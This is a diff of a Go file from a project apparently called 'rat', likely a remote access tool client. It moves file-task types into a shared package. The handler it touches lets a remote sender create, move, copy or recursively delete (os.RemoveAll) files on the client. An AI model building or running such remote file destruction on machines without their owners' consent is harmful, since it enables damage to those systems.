@@ -4,13 +4,13 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
-
-	"rat/client/network/header"
+	"rat/shared"
+	"rat/shared/network/header"
 	"strings"
 )
 
 type FilePacket struct {
-	Task        FileTask `network:"receive"`
+	Task        shared.FileTask `network:"receive"`
 	File        string          `network:"receive"`
 	Destination string          `network:"receive"`
 }
@@ -21,20 +21,20 @@ func (packet FilePacket) Header() header.PacketHeader {
 
 func (packet FilePacket) OnReceive() error {
 	file := packet.File
-	task := FileTask(packet.Task)
+	task := shared.FileTask(packet.Task)
 
 	switch task {
-	case Touch:
+	case shared.Touch:
 		f, ferr := os.Create(file)
 		if ferr != nil {
 			f.Close()
 		}
-	case Unlink:
+	case shared.Unlink:
 		os.RemoveAll(file)
-	case Move:
+	case shared.Move:
 		defer os.RemoveAll(file)
 		fallthrough
-	case Copy:
+	case shared.Copy:
 		dest := packet.Destination
 		stat, _ := os.Stat(file)
 
